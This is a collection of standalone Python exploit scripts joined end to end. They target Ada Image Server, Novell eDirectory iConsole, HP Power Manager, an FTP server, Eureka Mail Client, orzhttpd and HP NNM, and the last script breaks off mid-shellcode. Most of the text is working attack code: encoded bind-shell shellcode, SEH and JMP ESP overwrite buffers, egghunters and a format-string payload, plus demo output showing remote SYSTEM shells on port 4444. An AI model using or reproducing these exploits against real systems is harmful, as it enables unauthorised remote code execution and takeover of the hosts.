#!/usr/bin/python
# Only usable module with safeseh disabled on XP SP2 and XP SP3 is imgsrv.exe.
# However, it contains a null character in the address (ex: XP SP3 => 00689aff).
# Versions above 0.6.7 do not seem to be vulnerable.
# 
# $ ./imgsrv.py 192.168.1.146
#
# [*] Ada Image Server v0.6.6 SEH Overwrite
# [*] Discovered/Exploited by Blake
# [*] Tested on XP SP1
#
# [+] Connecting to 192.168.1.146
# [+] Sending payload
# [+] Payload Sent
#
# $ nc 192.168.1.146 4444
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Imgsvr>

import socket, sys

print "\n[*] Ada Image Server v0.6.6 SEH Overwrite"
print "[*] Discovered/Exploited by Blake"
print "[*] Tested on XP SP1\n"

if len(sys.argv)!= 2:
	print "[*] Usage: %s <ip>\n" % sys.argv[0]
	sys.exit(0)

host = sys.argv[1]
port = 1235		# default port

# windows/shell_bind_tcp - 696 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_mixed
# EXITFUNC=seh, LPORT=4444, RHOST=

shellcode = (
"\x89\xe1\xda\xd5\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x43\x5a\x4a\x4b\x50\x4d\x4d\x38\x4c\x39\x4b\x4f\x4b"
"\x4f\x4b\x4f\x43\x50\x4c\x4b\x42\x4c\x51\x34\x47\x54\x4c\x4b"
"\x51\x55\x47\x4c\x4c\x4b\x43\x4c\x44\x45\x42\x58\x45\x51\x4a"
"\x4f\x4c\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x47\x50\x43\x31"
"\x4a\x4b\x47\x39\x4c\x4b\x47\x44\x4c\x4b\x43\x31\x4a\x4e\x46"
"\x51\x49\x50\x4d\x49\x4e\x4c\x4d\x54\x49\x50\x43\x44\x44\x47"
"\x49\x51\x48\x4a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c\x34\x47"
"\x4b\x51\x44\x47\x54\x47\x58\x44\x35\x4a\x45\x4c\x4b\x51\x4f"
"\x51\x34\x43\x31\x4a\x4b\x42\x46\x4c\x4b\x44\x4c\x50\x4b\x4c"
"\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x44\x43\x46\x4c\x4c\x4b"
"\x4d\x59\x42\x4c\x46\x44\x45\x4c\x45\x31\x48\x43\x50\x31\x49"
"\x4b\x43\x54\x4c\x4b\x50\x43\x46\x50\x4c\x4b\x47\x30\x44\x4c"
"\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x47\x30\x43\x38\x51"
"\x4e\x42\x48\x4c\x4e\x50\x4e\x44\x4e\x4a\x4c\x50\x50\x4b\x4f"
"\x4e\x36\x45\x36\x50\x53\x43\x56\x43\x58\x46\x53\x46\x52\x45"
"\x38\x42\x57\x43\x43\x46\x52\x51\x4f\x51\x44\x4b\x4f\x48\x50"
"\x42\x48\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x50\x50\x4b\x4f\x48"
"\x56\x51\x4f\x4c\x49\x4d\x35\x45\x36\x4b\x31\x4a\x4d\x44\x48"
"\x43\x32\x50\x55\x42\x4a\x43\x32\x4b\x4f\x4e\x30\x45\x38\x48"
"\x59\x43\x39\x4a\x55\x4e\x4d\x46\x37\x4b\x4f\x4e\x36\x51\x43"
"\x51\x43\x51\x43\x51\x43\x51\x43\x51\x53\x51\x43\x50\x43\x50"
"\x53\x4b\x4f\x48\x50\x45\x36\x43\x58\x42\x31\x51\x4c\x45\x36"
"\x51\x43\x4d\x59\x4d\x31\x4a\x35\x43\x58\x4e\x44\x45\x4a\x44"
"\x30\x48\x47\x46\x37\x4b\x4f\x49\x46\x42\x4a\x42\x30\x46\x31"
"\x50\x55\x4b\x4f\x48\x50\x42\x48\x49\x34\x4e\x4d\x46\x4e\x4d"
"\x39\x46\x37\x4b\x4f\x4e\x36\x46\x33\x50\x55\x4b\x4f\x48\x50"
"\x43\x58\x4b\x55\x50\x49\x4c\x46\x50\x49\x46\x37\x4b\x4f\x4e"
"\x36\x50\x50\x51\x44\x50\x54\x50\x55\x4b\x4f\x48\x50\x4a\x33"
"\x42\x48\x4b\x57\x44\x39\x48\x46\x44\x39\x51\x47\x4b\x4f\x49"
"\x46\x46\x35\x4b\x4f\x48\x50\x45\x36\x42\x4a\x43\x54\x43\x56"
"\x42\x48\x42\x43\x42\x4d\x4b\x39\x4b\x55\x42\x4a\x50\x50\x50"
"\x59\x51\x39\x48\x4c\x4c\x49\x4a\x47\x43\x5a\x47\x34\x4b\x39"
"\x4a\x42\x46\x51\x49\x50\x4c\x33\x4e\x4a\x4b\x4e\x47\x32\x46"
"\x4d\x4b\x4e\x47\x32\x46\x4c\x4d\x43\x4c\x4d\x42\x5a\x50\x38"
"\x4e\x4b\x4e\x4b\x4e\x4b\x45\x38\x43\x42\x4b\x4e\x4e\x53\x44"
"\x56\x4b\x4f\x42\x55\x47\x34\x4b\x4f\x4e\x36\x51\x4b\x50\x57"
"\x51\x42\x50\x51\x50\x51\x50\x51\x42\x4a\x45\x51\x50\x51\x50"
"\x51\x50\x55\x50\x51\x4b\x4f\x4e\x30\x42\x48\x4e\x4d\x4e\x39"
"\x44\x45\x48\x4e\x46\x33\x4b\x4f\x49\x46\x43\x5a\x4b\x4f\x4b"
"\x4f\x46\x57\x4b\x4f\x48\x50\x4c\x4b\x50\x57\x4b\x4c\x4b\x33"
"\x49\x54\x42\x44\x4b\x4f\x49\x46\x50\x52\x4b\x4f\x48\x50\x43"
"\x58\x4c\x30\x4c\x4a\x43\x34\x51\x4f\x51\x43\x4b\x4f\x48\x56"
"\x4b\x4f\x4e\x30\x41\x41")


payload = "\x41" * 19000			# overwrites seh handler at 19734
nops = "\x90" * 29				# nop sled				
sc = shellcode					# shellcode - 696 bytes
near_jmp = "\xe9\x44\xfd\xff\xff"		# jump back -700 bytes
next_seh = "\xeb\xf9\xff\xff"			# jump back -7 bytes 
seh = "\x10\xbf\xc1\x77"			# c:\windows\system32\msvcrt.dll
junk = "\x43" * 262				# junk buffer


print "[+] Connecting to %s" % host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((host,port))
except:
	print "[x] Could not connect!\n"
	sys.exit(0)	

print "[+] Sending payload"
s.send("GET /" + payload + nops + sc + near_jmp + next_seh + seh + junk + " HTTP/1.0\r\n\r\n")
s.close()
print "[+] Payload Sent\n"
#!/usr/bin/python
# Novell eDirectory 8.8 SP5 iConsole BOF
# Vulnerability found by Hellcode Labs, 
# Original POC http://downloads.securityfocus.com/vulnerabilities/exploits/36815.pl
# 
# Exploit coded by Matteo Memelli | ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 04/11/2009 
#
# Process dhost.exe becomes unstable after pwnage, so we need to connect quickly to save our shell ;)
#
# root@bt:~# ./gotohell.py 172.16.30.201;nc -v 172.16.30.201 4444
# 302 Found
# DHAC1=c8280012; Path=/
# 172.16.30.201: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.201] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
# 
# C:\Novell\NDS\DIBFiles>whoami
# whoami
# nt authority\system
# 
# C:\Novell\NDS\DIBFiles>
 

import sys
import httplib, urllib

try:
   HOST = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]

def do_auth(usr, pwd):
   params = urllib.urlencode({'usr': usr, 'pwd': pwd, 'button': 'Login'})
   headers = {"Content-type": "application/x-www-form-urlencoded",
              "Accept": "text/plain"}
   conn = httplib.HTTPSConnection("%s:8030" % HOST)
   conn.request("POST", "/_LOGIN_SERVER_RSP_", params, headers)
   response = conn.getresponse()
   cookie=response.getheaders()[1][1]
   print response.status, response.reason
   data = response.read()
   conn.close()
   print cookie
   return cookie

def do_pwn(evil, cookie):
   headers = {"Host": "%s:8030" % HOST,
              "Cookie": "%s" % cookie}
   conn = httplib.HTTPSConnection("%s:8030" % HOST)
   conn.request("GET", "/dhost/modules?L:"+evil, None, headers)

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
shellcode = (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
"\x4d\x54\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x48"
"\x4e\x36\x46\x52\x46\x42\x4b\x58\x45\x54\x4e\x43\x4b\x38\x4e\x37"
"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x54\x4a\x31\x4b\x58"
"\x4f\x55\x42\x52\x41\x50\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x58"
"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c"
"\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x55\x46\x42\x4a\x32\x45\x47\x45\x4e\x4b\x58"
"\x4f\x55\x46\x42\x41\x30\x4b\x4e\x48\x36\x4b\x48\x4e\x50\x4b\x34"
"\x4b\x48\x4f\x45\x4e\x31\x41\x50\x4b\x4e\x43\x30\x4e\x52\x4b\x38"
"\x49\x58\x4e\x36\x46\x42\x4e\x41\x41\x36\x43\x4c\x41\x43\x4b\x4d"
"\x46\x56\x4b\x48\x43\x44\x42\x53\x4b\x58\x42\x44\x4e\x30\x4b\x48"
"\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x34\x4a\x30\x50\x35\x4a\x56"
"\x50\x48\x50\x54\x50\x50\x4e\x4e\x42\x35\x4f\x4f\x48\x4d\x48\x46"
"\x43\x55\x48\x56\x4a\x46\x43\x53\x44\x33\x4a\x36\x47\x37\x43\x57"
"\x44\x33\x4f\x35\x46\x55\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x53\x42\x55\x4f\x4f\x48\x4d\x4f\x55\x49\x58\x45\x4e"
"\x48\x46\x41\x58\x4d\x4e\x4a\x50\x44\x30\x45\x35\x4c\x46\x44\x50"
"\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x55"
"\x4f\x4f\x48\x4d\x43\x45\x43\x35\x43\x45\x43\x55\x43\x45\x43\x34"
"\x43\x45\x43\x44\x43\x35\x4f\x4f\x42\x4d\x48\x56\x4a\x36\x41\x31"
"\x4e\x35\x48\x46\x43\x45\x49\x48\x41\x4e\x45\x59\x4a\x46\x46\x4a"
"\x4c\x41\x42\x37\x47\x4c\x47\x55\x4f\x4f\x48\x4d\x4c\x36\x42\x41"
"\x41\x45\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x52"
"\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x35\x4f\x4f\x42\x4d"
"\x4a\x56\x45\x4e\x49\x44\x48\x38\x49\x54\x47\x55\x4f\x4f\x48\x4d"
"\x42\x55\x46\x45\x46\x45\x45\x45\x4f\x4f\x42\x4d\x43\x49\x4a\x46"
"\x47\x4e\x49\x57\x48\x4c\x49\x57\x47\x55\x4f\x4f\x48\x4d\x45\x55"
"\x4f\x4f\x42\x4d\x48\x56\x4c\x46\x46\x36\x48\x36\x4a\x56\x43\x36"
"\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x45\x49\x45\x49\x32\x4e\x4c"
"\x49\x48\x47\x4e\x4c\x56\x46\x34\x49\x48\x44\x4e\x41\x33\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x32\x50\x4f\x44\x54\x4e\x52"
"\x43\x39\x4d\x58\x4c\x57\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46"
"\x44\x37\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x47\x46\x34\x4f\x4f"
"\x48\x4d\x4b\x35\x47\x45\x44\x35\x41\x35\x41\x35\x41\x45\x4c\x56"
"\x41\x30\x41\x35\x41\x35\x45\x55\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
"\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x46"
"\x4f\x4f\x4f\x4f\x47\x53\x4f\x4f\x42\x4d\x4b\x48\x47\x55\x4e\x4f"
"\x43\x58\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
"\x4a\x56\x4f\x4e\x50\x4c\x42\x4e\x42\x56\x43\x45\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a")

## PUT YOUR CREDENTIALS HERE ##
usr = ".Admin.O=offsec.OFFSEC."
pwd = "admin"
###############################
j1  = "\xEB\x06\x90\x90"
j2  = "\xE9\x26\xFD\xFF\xFF"
n1  = "\x90"*8
n2  = "\x90"*4
p1  = "\x41"*947
p2  = "\x42"*221
ret = "\x6A\x38\x81\x64" # 0x6481386A nmasldap.dll SafeSEH unprotected
evil = p1 + n1 + shellcode + j1 + ret + n2 + j2 + p2
# sweet biscuit...
cookie = do_auth(usr, pwd)
# sh...
do_pwn(evil, cookie)
#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Win2k3 Ent SP2 English, Win XP Sp2 English
# Matteo Memelli ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 07/11/2009
#
# ryujin@bt:~$ ./hppowermanager.py 172.16.30.203
# HP Power Manager Administration Universal Buffer Overflow Exploit
# ryujin __A-T__ offensive-security.com
# [+] Sending evil buffer...
# HTTP/1.0 200 OK
# [+] Done!
# [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell
# ryujin@bt:~$ nc -v 172.16.30.203 4444
# 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.203] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.

# C:\WINDOWS\system32>

import sys
from socket import *

print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "ryujin __A-T__ offensive-security.com"

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
SHELL = (
"n00bn00b"
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
"\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x38"
"\x4e\x56\x46\x32\x46\x42\x4b\x58\x45\x34\x4e\x33\x4b\x48\x4e\x47"
"\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x51\x4b\x38"
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x58"
"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x4a\x52\x45\x47\x45\x4e\x4b\x58"
"\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x50\x4b\x54"
"\x4b\x58\x4f\x55\x4e\x31\x41\x30\x4b\x4e\x43\x50\x4e\x42\x4b\x48"
"\x49\x38\x4e\x36\x46\x52\x4e\x31\x41\x46\x43\x4c\x41\x43\x4b\x4d"
"\x46\x46\x4b\x38\x43\x54\x42\x33\x4b\x38\x42\x54\x4e\x30\x4b\x48"
"\x42\x37\x4e\x31\x4d\x4a\x4b\x48\x42\x34\x4a\x30\x50\x35\x4a\x46"
"\x50\x48\x50\x34\x50\x50\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x56"
"\x43\x45\x48\x46\x4a\x36\x43\x43\x44\x33\x4a\x46\x47\x47\x43\x57"
"\x44\x33\x4f\x55\x46\x45\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x33\x42\x45\x4f\x4f\x48\x4d\x4f\x55\x49\x38\x45\x4e"
"\x48\x36\x41\x38\x4d\x4e\x4a\x30\x44\x50\x45\x35\x4c\x56\x44\x50"
"\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
"\x4f\x4f\x48\x4d\x43\x55\x43\x55\x43\x35\x43\x45\x43\x35\x43\x34"
"\x43\x35\x43\x54\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x41\x41"
"\x4e\x35\x48\x46\x43\x55\x49\x58\x41\x4e\x45\x39\x4a\x36\x46\x4a"
"\x4c\x31\x42\x47\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x46\x42\x51"
"\x41\x35\x45\x55\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x42"
"\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x55\x4f\x4f\x42\x4d"
"\x4a\x56\x45\x4e\x49\x54\x48\x58\x49\x54\x47\x45\x4f\x4f\x48\x4d"
"\x42\x55\x46\x45\x46\x45\x45\x35\x4f\x4f\x42\x4d\x43\x59\x4a\x46"
"\x47\x4e\x49\x57\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x35"
"\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x56\x4a\x46\x43\x36"
"\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x55\x49\x35\x49\x52\x4e\x4c"
"\x49\x58\x47\x4e\x4c\x56\x46\x54\x49\x38\x44\x4e\x41\x43\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x32\x50\x4f\x44\x34\x4e\x42"
"\x43\x59\x4d\x38\x4c\x57\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
"\x44\x57\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x47\x46\x34\x4f\x4f"
"\x48\x4d\x4b\x35\x47\x45\x44\x35\x41\x55\x41\x45\x41\x35\x4c\x56"
"\x41\x30\x41\x55\x41\x45\x45\x35\x41\x35\x4f\x4f\x42\x4d\x4a\x56"
"\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x36"
"\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x58\x47\x45\x4e\x4f"
"\x43\x58\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
"\x4a\x36\x4f\x4e\x50\x4c\x42\x4e\x42\x56\x43\x45\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a")

EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,SHELL,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
s.close()
#!/usr/bin/python
import socket
import sys

def Usage():
    print ("Usage:  ./expl.py <serv_ip>      <Username> <password>\n")
    print ("Example:./expl.py 192.168.48.183 anonymous anonymous\n")
if len(sys.argv) <> 4:
        Usage()
        sys.exit(1)
else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    sock.send("user %s\r\n" %username)
    r=sock.recv(1024)
    sock.send("pass %s\r\n" %passwd)
    r=sock.recv(1024)
    sock.send("MKD ../A\r\n")
    sock.close()
    sys.exit(0);
#!/usr/bin/env python
# Found By: Francis Provencher {PRL}
# Tested On: Windows XPSP3 English
# Note: This script sets up a fake SMTP server
# Note: Set the client to this address and check your mail
##########################################################

import sys, socket

# egghunter (32 bytes)
egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"\x77\x30\x30\x74" # this is the egg: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

# windows/shell_bind_tcp - 368 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=thread, LPORT=4444

bindshell = ("\xbb\xd3\x82\x28\x36\xd9\xc6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x56\x83\xee\xfc\x31\x5e\x0f\x03\x5e\xdc\x60\xdd\xca\x0a\xed"
"\x1e\x33\xca\x8e\x97\xd6\xfb\x9c\xcc\x93\xa9\x10\x86\xf6\x41"
"\xda\xca\xe2\xd2\xae\xc2\x05\x53\x04\x35\x2b\x64\xa8\xf9\xe7"
"\xa6\xaa\x85\xf5\xfa\x0c\xb7\x35\x0f\x4c\xf0\x28\xff\x1c\xa9"
"\x27\xad\xb0\xde\x7a\x6d\xb0\x30\xf1\xcd\xca\x35\xc6\xb9\x60"
"\x37\x17\x11\xfe\x7f\x8f\x1a\x58\xa0\xae\xcf\xba\x9c\xf9\x64"
"\x08\x56\xf8\xac\x40\x97\xca\x90\x0f\xa6\xe2\x1d\x51\xee\xc5"
"\xfd\x24\x04\x36\x80\x3e\xdf\x44\x5e\xca\xc2\xef\x15\x6c\x27"
"\x11\xfa\xeb\xac\x1d\xb7\x78\xea\x01\x46\xac\x80\x3e\xc3\x53"
"\x47\xb7\x97\x77\x43\x93\x4c\x19\xd2\x79\x23\x26\x04\x25\x9c"
"\x82\x4e\xc4\xc9\xb5\x0c\x81\x3e\x88\xae\x51\x28\x9b\xdd\x63"
"\xf7\x37\x4a\xc8\x70\x9e\x8d\x2f\xab\x66\x01\xce\x53\x97\x0b"
"\x15\x07\xc7\x23\xbc\x27\x8c\xb3\x41\xf2\x03\xe4\xed\xac\xe3"
"\x54\x4e\x1c\x8c\xbe\x41\x43\xac\xc0\x8b\xf2\xea\x0e\xef\x57"
"\x9d\x72\x0f\x46\x01\xfa\xe9\x02\xa9\xaa\xa2\xba\x0b\x89\x7a"
"\x5d\x73\xfb\xd6\xf6\xe3\xb3\x30\xc0\x0c\x44\x17\x63\xa0\xec"
"\xf0\xf7\xaa\x28\xe0\x08\xe7\x18\x6b\x31\x60\xd2\x05\xf0\x10"
"\xe3\x0f\x62\xb0\x76\xd4\x72\xbf\x6a\x43\x25\xe8\x5d\x9a\xa3"
"\x04\xc7\x34\xd1\xd4\x91\x7f\x51\x03\x62\x81\x58\xc6\xde\xa5"
"\x4a\x1e\xde\xe1\x3e\xce\x89\xbf\xe8\xa8\x63\x0e\x42\x63\xdf"
"\xd8\x02\xf2\x13\xdb\x54\xfb\x79\xad\xb8\x4a\xd4\xe8\xc7\x63"
"\xb0\xfc\xb0\x99\x20\x02\x6b\x1a\x40\xe1\xb9\x57\xe9\xbc\x28"
"\xda\x74\x3f\x87\x19\x81\xbc\x2d\xe2\x76\xdc\x44\xe7\x33\x5a"
"\xb5\x95\x2c\x0f\xb9\x0a\x4c\x1a")

buff = ("\x41" * 710);
retn = ("\x53\x93\x42\x7e"); #JMP ESP USER32.DLL XPSP3
nops = ("\x90" * 218);
junk = ("\xcc" * 2000);
sploit = ("-ERR " + buff + retn + egghunter + nops + junk + "w00tw00t" + bindshell);

print ("""
##########################################################
#
# Eureka Mail Client Remote Buffer Overflow Exploit (XPSP3)
# Coded By: Dr_IDE and dookie2000ca
# Found By: Francis Provencher {PRL}
# Tested On: Windows XPSP3
# Note: This script sets up a fake SMTP server
# Note: Point the client to this address and check your mail
#
##########################################################
""")

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', 110))
	s.listen(1)
	print ("[*] Listening on port 110.")
	print ("[*] Have someone connect to you.")
	print ("[*] Type <control>-c to exit.")
	conn, addr = s.accept()
	print '[*] Received connection from: ', addr

	while 1:
		conn.send(sploit)
	conn.close()
except:
	print ("[*] Done. Wait a bit for the egghunter then connect to the victim on port 4444")
#!/usr/bin/env python
# orzex.py -- Patroklos Argyroudis, argp at domain census-labs.com
# http://code.google.com/p/orzhttpd/source/detail?r=141

import os
import sys
import socket
import struct
import time
import urllib

GET = "GET "

def main(argv):
    argc = len(argv)

    if argc != 4:
        print "usage: %s <host> <port> <address>" % (argv[0])
        print "[*] find address with objdump -R orzhttpd | grep fprintf"
        sys.exit(0)

    host = argv[1]
    port = int(argv[2])
    addr = int(argv[3], 16)

    print "[*] target: %s:%d:%s" % (host, port, argv[3])

    try:
        sd = urllib.urlopen("http://%s:%d" % (host, port))
        sd.close()
    except IOError, errmsg:
        print "[*] error: %s" % (errmsg)
        sys.exit(1)
    
    time.sleep(1)

    fmtstr = struct.pack('<LL', addr + 2, addr)
    fmtstr += "%.16650x%19$hn%.514x%20$hn"

    payload = GET
    payload += fmtstr

    print "[*] sending exploit format string to %s:%d" % (host, port)

    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sd.connect((host, port))
    sd.send(payload)
    sd.close()

    print "[*] sending trigger to %s:%d" % (host, port)

    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sd.connect((host, port))
    sd.send(GET)
    sd.close()
    
if __name__ == "__main__":
    main(sys.argv)
    sys.exit(0)

# EOF#!/usr/bin/python
# HP NNP ovalarm.exe CGI Remote Buffer Overflow - Pre Authentication
# Tested on XP SP3 + IIS + NNM Release B.07.50
# Authors: muts & sinn3r  (x90.sinner {a.t} gmail.c0m)
# Reference: http://dvlabs.tippingpoint.com/advisory/TPTI-09-12
# http://www.offensive-security.com/0day/exploit-nnm-ovalarm.py.txt
#
# ** Big thanks to dookie for identifying the problem & testing for us! **
#
# IMPORTANT: How to recreate the vulnerable state:
# 1. Download NNM from exploit-db.com, install it
# 2. Go to Start -> All Programs -> HP OpenView Patches -> OpenView Network Node Manager 7.51 -> run "NNM_01187 Uninstall". And then reboot.
# 3. After the patch is removed, open command prompt, go to C:\Inetpub\AdminScrips\
#    cscript.exe adsutil.vbs set w3svc/CreateProcessAsUser "false"
#
# Demo:
# sinn3r@backtrack:~$ ./nnm.py 192.168.3.2
# [+] Sending evil buffer to NNMz
# [+] Done!
# sinn3r@backtrack:~$ nc -vn 192.168.3.2 4444
# (UNKNOWN) [192.168.3.2] 4444 (?) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\HP OpenView\www\cgi-bin> 
###################################################################################

import socket, sys

if (len(sys.argv) != 2):
        print "[+] HP NNM 7.53 ovalarm.exe CGI Remote Buffer Overflow"
	print "[+] Usage: %s <Target>" %sys.argv[0]
	sys.exit(0)

#win32_bind -  EXITFUNC=thread LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com 
shellcode = ("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
